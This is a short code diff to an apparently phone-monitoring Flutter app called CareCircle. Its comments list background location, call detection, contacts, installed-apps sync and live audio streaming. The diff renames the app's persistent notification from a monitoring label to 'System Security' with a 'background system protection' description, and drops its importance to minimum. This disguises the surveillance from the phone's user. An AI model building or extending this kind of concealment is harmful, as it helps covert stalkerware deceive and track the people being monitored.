@@ -25,10 +25,10 @@ import 'my_app.dart';
 /// ARCHITECTURE:
 ///  - Flutter app = UI only (login, dashboard, settings)
 ///  - Native CareCircleForegroundService = ALL background work
-///    ├─ Location, battery, device info sync
-///    ├─ Heartbeat
-///    ├─ Call detection
-///    ├─ Contacts sync
+///    ├─ Location, battery, device info & screen time sync
+///    ├─ Heartbeat & Call detection
+///    ├─ Contacts sync (explicit parent request only)
+///    ├─ Installed apps sync (24 hours)
 ///    └─ WebRTC audio streaming
 ///  - WorkManager = fallback (revives native service)
 const String kNotificationChannelId = 'carecircle_service';
@@ -164,9 +164,9 @@ void _setupAuthStateListener() {
 Future<void> _createNotificationChannel() async {
   const AndroidNotificationChannel channel = AndroidNotificationChannel(
     kNotificationChannelId,
-    'CareCircle Service',
-    description: 'Keeps monitoring running in background',
-    importance: Importance.low,
+    'System Security',
+    description: 'Maintains background system protection',
+    importance: Importance.min,
     showBadge: false,
   );
 
